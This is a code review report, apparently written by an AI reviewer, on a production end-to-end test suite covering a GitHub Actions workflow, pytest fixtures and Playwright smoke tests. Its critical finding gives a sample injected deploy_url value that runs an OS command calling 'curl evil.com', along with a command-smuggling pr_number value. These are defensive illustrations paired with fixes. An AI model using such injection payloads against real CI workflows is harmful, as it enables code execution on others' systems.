---
phase: 25-production-e2e-test-suite
reviewed: 2026-05-02T07:30:00Z
depth: standard
files_reviewed: 16
files_reviewed_list:
  - .github/workflows/e2e-prod.yml
  - apps/web/e2e/prod-smoke.spec.ts
  - apps/web/playwright.prod.config.ts
  - services/agent-orchestrator/pytest.ini
  - services/agent-orchestrator/requirements.test.txt
  - services/agent-orchestrator/scripts/cascading_report.py
  - services/agent-orchestrator/scripts/setup_e2e_anchor.py
  - services/agent-orchestrator/tests/e2e/conftest.py
  - services/agent-orchestrator/tests/e2e/conftest_prod.py
  - services/agent-orchestrator/tests/e2e/report_generator.py
  - services/agent-orchestrator/tests/e2e/wave_a_api_contracts.py
  - services/agent-orchestrator/tests/e2e/wave_b_agent_health.py
  - services/agent-orchestrator/tests/e2e/wave_c_agent_triggers.py
  - services/agent-orchestrator/tests/e2e/wave_d_toast_pipeline.py
  - services/agent-orchestrator/tests/e2e/wave_e_gmail_pipeline.py
  - services/agent-orchestrator/tests/e2e/wave_g_calendar.py
findings:
  critical: 1
  warning: 8
  info: 5
  total: 14
status: issues_found
---

# Phase 25: Code Review Report

**Reviewed:** 2026-05-02T07:30:00Z
**Depth:** standard
**Files Reviewed:** 16
**Status:** issues_found

## Summary

Phase 25 introduces a comprehensive production E2E test suite covering API contracts, agent health, RabbitMQ trigger resilience, Toast/Gmail/Calendar pipelines, and Playwright frontend smoke tests. The overall design is sound — session-scoped fixtures, idempotent teardown, and Sentry instrumentation are all well-structured. Three issues require attention before relying on this suite in CI:

1. A script injection vulnerability in the GitHub Actions workflow where `inputs.deploy_url` and `inputs.pr_number` are interpolated directly into executable Python/JavaScript code.
2. A systematic false failure in Wave F-3 (`loadTime < 5_000ms`) because the timer starts before the login flow rather than after it.
3. A set-iteration-order bug in `cascading_report.py` that causes multi-hop cascade failures (e.g., A→B→C) to be reported as independent root causes rather than a single cluster, degrading the diagnostic value of the cascade report.

The remaining warnings are lower urgency — mostly bare `except` swallowers in polling helpers that produce confusing timeout errors instead of actionable messages, and a skipped-test misclassification in the report generator.

---

## Critical Issues

### CR-01: Script injection via `inputs.deploy_url` and `inputs.pr_number` in workflow

**File:** `.github/workflows/e2e-prod.yml:265` and `:284`

**Issue:** GitHub Actions expressions (`${{ inputs.deploy_url }}` and `${{ inputs.pr_number }}`) are evaluated before the shell script runs, even inside heredoc blocks. The values are substituted verbatim into the Python source string and the `github-script` JavaScript body. A malicious `deploy_url` value such as:
```
https://x.com", "x": __import__('os').system('curl evil.com') + "
```
would produce syntactically valid Python that executes an OS command. Similarly, a non-integer `pr_number` (e.g., `0; process.exit(1)`) breaks the `issue_number` field. `workflow_dispatch` inputs require write access, which limits exposure, but defense-in-depth requires passing untrusted values through the environment rather than code interpolation.

**Fix:** Pass the inputs as environment variables and read them in the script:

```yaml
- name: Sentry alert — deploy gate failure (D-14)
  env:
    DEPLOY_URL: ${{ inputs.deploy_url }}
    PR_NUMBER: ${{ inputs.pr_number }}
  run: |
    python - <<'EOF'
    import os, sentry_sdk
    dsn = os.environ.get("SENTRY_DSN")
    if dsn:
        sentry_sdk.init(dsn=dsn, traces_sample_rate=0.0)
        sentry_sdk.capture_message(
            "Production E2E Deploy Gate Failed",
            level="error",
            tags={
                "deploy-gate": "true",
                "e2e-failure": "true",
                "triggered_by": "deploy",
                "github_sha": os.environ.get("GITHUB_SHA", "unknown"),
                "deploy_url": os.environ.get("DEPLOY_URL", ""),  # safe
            },
        )
        sentry_sdk.flush(2)
        print("Sentry deploy-gate alert fired")
    EOF
```

For the PR comment step, the `issue_number` field should be validated:

```javascript
const prNum = parseInt(process.env.PR_NUMBER || '', 10)
if (!prNum) return  // skip if not a valid integer
await github.rest.issues.createComment({
  owner: context.repo.owner,
  repo: context.repo.repo,
  issue_number: prNum,
  body: [ ... ].join('\n')
})
```

---

## Warnings

### WR-01: Wave F-3 load-time timer starts before login — 5 s assertion will systematically fail

**File:** `apps/web/e2e/prod-smoke.spec.ts:112-124`

**Issue:** `startTime = Date.now()` is set before `loginWithRealCredentials`, which itself calls `page.goto('/login', { waitUntil: 'networkidle', timeout: 20_000 })` (can take 3–5 s on a live URL) plus the POST auth request and redirect. By the time `const loadTime = Date.now() - startTime` is computed on line 123, the elapsed time almost certainly exceeds 5 000 ms. The test was meant to verify dashboard load time, not the total login-plus-navigate duration.

**Fix:** Start the timer after login and redirect are confirmed:

```typescript
test('Wave F-3: dashboard loads within 5s with no console errors', async ({ page }) => {
  const consoleErrors: string[] = []
  page.on('console', (msg: ConsoleMessage) => {
    if (msg.type() === 'error') consoleErrors.push(msg.text())
  })
  page.on('pageerror', (err: Error) => {
    consoleErrors.push(`PageError: ${err.message}`)
  })

  await loginWithRealCredentials(page)
  await expect(page).not.toHaveURL(/\/login/, { timeout: 15_000 })

  // Timer starts HERE — after login and redirect, measuring only dashboard load
  const startTime = Date.now()
  const currentUrl = page.url()
  if (!currentUrl.includes('/dashboard')) {
    await page.goto('/dashboard', { waitUntil: 'networkidle', timeout: 15_000 })
  }
  const loadTime = Date.now() - startTime
  expect(loadTime).toBeLessThan(5_000)
  // ... rest of error filter assertions
```

---

### WR-02: Multi-hop cascade detection in `determine_root_causes` is set-iteration-order dependent

**File:** `services/agent-orchestrator/scripts/cascading_report.py:214-219`

**Issue:** `failed_waves` is a Python `set` and is iterated in arbitrary hash order. When a failure chain spans two hops (e.g., A fails → B fails [depends on A] → C fails [depends on B]), the outer loop processes each candidate wave once. If `C` is encountered before `B` has been added to `cluster_waves`, the check `any(d in cluster_waves for d in deps)` evaluates `B in {A}` → False, so C is not added to the cluster. C ends up in `unassigned` and is reported as an independent root cause rather than cascading from A, producing incorrect diagnostic output.

**Fix:** Replace the single-pass iteration with a fixpoint loop:

```python
def determine_root_causes(failed_waves: Set[str]) -> List[Dict]:
    if not failed_waves:
        return []

    root_causes = set()
    for wave in failed_waves:
        deps = WAVE_DEPS.get(wave, [])
        if all(dep not in failed_waves for dep in deps):
            root_causes.add(wave)

    clusters = []
    assigned: Set[str] = set()
    for root in sorted(root_causes):
        cluster_waves = {root}
        # Fixpoint: keep expanding until no new waves are added
        changed = True
        while changed:
            changed = False
            for wave in failed_waves:
                if wave not in cluster_waves:
                    deps = WAVE_DEPS.get(wave, [])
                    if root in deps or any(d in cluster_waves for d in deps):
                        cluster_waves.add(wave)
                        changed = True
        assigned.update(cluster_waves)
        # ... rest of cluster building
```

---

### WR-03: `prod_jwt` fixture raises `HTTPStatusError` on auth failure — no descriptive skip message

**File:** `services/agent-orchestrator/tests/e2e/conftest_prod.py:150-152`

**Issue:** `resp.raise_for_status()` on line 150 raises `httpx.HTTPStatusError` directly if the Supabase auth endpoint returns 4xx (wrong credentials, disabled account, etc.). Since `prod_jwt` is session-scoped, all tests depending on it fail with an opaque HTTP error instead of a `pytest.skip` with a human-readable explanation. On first run in a new CI environment this is confusing.

**Fix:**

```python
try:
    resp.raise_for_status()
except httpx.HTTPStatusError as exc:
    pytest.skip(
        f"Supabase auth failed ({exc.response.status_code}) for E2E_TEST_EMAIL. "
        f"Check credentials are correct and account is enabled. "
        f"Body: {exc.response.text[:200]}"
    )
data = resp.json()
access_token = data.get("access_token")
if not access_token:
    pytest.skip(
        f"Supabase auth response missing 'access_token'. "
        f"Response keys: {list(data.keys())}"
    )
return access_token
```

---

### WR-04: `report_generator.py` misclassifies skipped tests as "failed"

**File:** `services/agent-orchestrator/tests/e2e/report_generator.py:52-58`

**Issue:** When `pytest.skip()` is called inside a test body, pytest propagates it as `_pytest.outcomes.Skipped` — a subclass of `BaseException`. In `pytest_runtest_makereport`, the check `if call.excinfo is not None` evaluates True for skipped tests, and `outcome = "failed"` is set without checking whether the exception is a skip. The `pytest_runtest_logreport` handler adds a second "skipped" entry only when the test isn't already recorded, but since the "failed" entry is already present, skips remain labeled as failures in the JSON report, inflating the failed count.

**Fix:** Distinguish skip exceptions from real failures:

```python
if call.excinfo is not None:
    import _pytest.outcomes as _outcomes
    if isinstance(call.excinfo.value, _outcomes.Skipped):
        outcome = "skipped"
        error = None
    else:
        outcome = "failed"
        tb = call.excinfo.getrepr(style="short")
        error = {
            "message": str(call.excinfo.value),
            "traceback": str(tb),
        }
```

---

### WR-05: Hard-coded `waitForTimeout(5_000)` in Wave F-2 is fragile

**File:** `apps/web/e2e/prod-smoke.spec.ts:89`

**Issue:** `await page.waitForTimeout(5_000)` waits a fixed 5 seconds regardless of whether the API data has already arrived or is still pending. If the `/admin/health` endpoint is slow (e.g., > 5 s response time), the agent cards will not yet be rendered and `getByText('Active').count()` returns 0, causing a false failure. Conversely, on a fast connection the test wastes 5 s every run.

**Fix:** Replace the fixed wait with a dynamic assertion:

```typescript
// Wait dynamically for at least 7 Active badges to appear, up to 10s
await expect(page.getByText('Active', { exact: true }).nth(6)).toBeVisible({ timeout: 10_000 })
const activeStatusBadges = page.getByText('Active', { exact: true })
const cardCount = await activeStatusBadges.count()
expect(cardCount).toBeGreaterThanOrEqual(7)
```

---

### WR-06: `check_agent_still_healthy` swallows network failures, returns false-positive "healthy"

**File:** `services/agent-orchestrator/tests/e2e/wave_c_agent_triggers.py:193-196`

**Issue:** The outer `except Exception: pass` inside the polling loop swallows ALL exceptions — including network timeouts, DNS failures, and connection refused errors. If the health endpoint is completely unreachable during the 5-second window, the function exits the loop with `return True` (line 197), falsely indicating the agent is healthy. A flaky network becomes invisible.

**Fix:** Only suppress expected transient errors; surface persistent connectivity failures:

```python
except httpx.HTTPStatusError:
    pass  # Non-200 from health endpoint — keep polling
except (httpx.ConnectError, httpx.ReadTimeout, httpx.ConnectTimeout):
    pass  # Transient network issue — keep polling
# Do NOT catch Exception broadly; let unexpected errors propagate
```

---

### WR-07: Bare `except` in Supabase polling helpers silently converts DB errors into timeout failures

**Files:**
- `services/agent-orchestrator/tests/e2e/wave_d_toast_pipeline.py:159-161`
- `services/agent-orchestrator/tests/e2e/wave_e_gmail_pipeline.py:99-101`
- `services/agent-orchestrator/tests/e2e/wave_g_calendar.py:121-122, 136-137`

**Issue:** In each of these polling helpers (`poll_supabase_for_webhook_record`, `poll_notification_delivery`, `poll_for_reminder_scheduled`), the query is wrapped in `except Exception: pass`. If the Supabase client raises due to an authentication error, a missing table, or a malformed query, the exception is silently swallowed. The test then times out and reports "record not found within Xs" — masking the real root cause (DB access failure) and making debugging significantly harder.

**Fix (apply the same pattern to all three files):** Log the error on first occurrence and only suppress transient errors:

```python
last_exc = None
while loop.time() < deadline:
    try:
        result = prod_supabase.table(...).select(...).execute()
        # ... check result
    except Exception as exc:
        if last_exc is None:
            # Log once so the error appears in pytest output
            print(f"[poll] Supabase query error (will retry): {exc}", flush=True)
        last_exc = exc
    await asyncio.sleep(2.0)
# If we timed out due to a persistent error, surface it
if last_exc:
    raise RuntimeError(f"Supabase poll failed after {timeout_seconds}s: {last_exc}") from last_exc
return False
```

---

### WR-08: `e2e-cal-001` registered twice in `e2e_created_ids`, once per test

**File:** `services/agent-orchestrator/tests/e2e/wave_g_calendar.py:174` and `89`

**Issue:** `test_calendar_event_upsert_succeeds` (line 174) appends `{"table": "calendar_events", "id": "e2e-cal-001"}` to `e2e_created_ids`. Then `test_calendaragent_schedules_t7_reminder` (line 191) calls `upsert_calendar_event(prod_supabase, e2e_created_ids)` which also appends the same entry (line 89). The session teardown attempts to delete the record twice. The second delete is a no-op, but if the first delete fails for a transient reason, the error message shows two failed attempts referencing the same record, confusing the Sentry orphan report.

**Fix:** In `upsert_calendar_event`, guard against duplicate registration:

```python
async def upsert_calendar_event(prod_supabase, e2e_created_ids: list) -> None:
    payload = make_test_event_payload()
    prod_supabase.table(CALENDAR_EVENTS_TABLE).upsert(payload, on_conflict="id").execute()
    # Only register if not already tracked
    if not any(r.get("id") == E2E_CAL_EVENT_ID for r in e2e_created_ids):
        e2e_created_ids.append({"table": CALENDAR_EVENTS_TABLE, "id": E2E_CAL_EVENT_ID})
```

Alternatively, remove the `e2e_created_ids.append` call from `test_calendar_event_upsert_succeeds` since `test_calendaragent_schedules_t7_reminder` calls the authoritative helper.

---

## Info

### IN-01: Redundant `!= 500` assertion after `in expected_statuses` guard

**File:** `services/agent-orchestrator/tests/e2e/wave_a_api_contracts.py:116, 153`

**Issue:** `assert resp.status_code != 500` is dead code: if `resp.status_code` is 500 and 500 is not in `expected_statuses`, the preceding assertion already fails. The `!= 500` check only adds value if 500 were in `expected_statuses`, which it never is. Same pattern appears at line 153.

**Fix:** Remove the redundant assertions to reduce noise:

```python
# Remove these — already covered by the assert above
# assert resp.status_code != 500, f"500 error on {path}: {resp.text[:300]}"
```

---

### IN-02: `test_unknown_route_404` in Wave A skips retry logic used by all other tests

**File:** `services/agent-orchestrator/tests/e2e/wave_a_api_contracts.py:37`

**Issue:** Every other test in Wave A uses `get_with_retry`. `test_unknown_route_404` calls `client.get()` directly. On a flaky network this single test could fail spuriously while the others succeed.

**Fix:**

```python
async def test_unknown_route_404(self, prod_base_url: str):
    async with httpx.AsyncClient(base_url=prod_base_url) as client:
        resp = await get_with_retry(client, "/api/v1/nonexistent-e2e-probe", timeout=15.0)
    assert resp.status_code == 404, ...
```

---

### IN-03: `report_generator.py` has an unguarded `pytest_configure` at module level

**File:** `services/agent-orchestrator/tests/e2e/report_generator.py:115-117`

**Issue:** `report_generator.py` defines a top-level `pytest_configure` function that registers `E2EReportGenerator`. `conftest.py` also calls `config.pluginmanager.register(E2EReportGenerator(), ...)` but with a duplicate-guard. If pytest ever auto-discovers `report_generator.py` as a conftest (e.g., by placing it in a directory that pytest scans for conftest files), the unguarded registration would attempt to register a second instance under the same name, raising a `ValueError`.

**Fix:** Add the same guard used in `conftest.py`:

```python
def pytest_configure(config):
    if not config.pluginmanager.get_plugin("e2e_report_generator"):
        config.pluginmanager.register(E2EReportGenerator(), "e2e_report_generator")
```

---

### IN-04: `cascading_report.py` hardcodes wave letters as a string literal

**File:** `services/agent-orchestrator/scripts/cascading_report.py:273`

**Issue:** `for wave in sorted("ABCDEFG"):` iterates characters of a string literal rather than the actual result keys. If a new wave is added to the suite in a future phase, the Markdown table in the cascading report will silently omit it.

**Fix:**

```python
# Use the actual collected keys so future waves are included automatically
for wave in sorted(wave_results.keys()):
```

---

### IN-05: Wave F-1 `isValidRedirect` assertion is vacuously true

**File:** `apps/web/e2e/prod-smoke.spec.ts:65-73`

**Issue:** The `isValidRedirect` variable is true if the URL matches any of several patterns OR if `!url.includes('/login')`. The final condition is always true whenever none of the earlier conditions match AND `not.toHaveURL(/\/login/)` (line 61) already passed. This means `expect(isValidRedirect).toBeTruthy()` will never fail after line 61 passes — the check is redundant and would not catch a redirect to an error page such as `/500` or `/unauthorized`.

**Fix:** Either remove the redundant check, or assert against a known valid set of landing pages:

```typescript
const validPaths = ['/dashboard', '/admin', '/studio', '/home', '/']
const postLoginPath = new URL(page.url()).pathname
const isKnownPath = validPaths.some(p => postLoginPath === p || postLoginPath.startsWith(p))
expect(isKnownPath).toBeTruthy()
```

---

_Reviewed: 2026-05-02T07:30:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
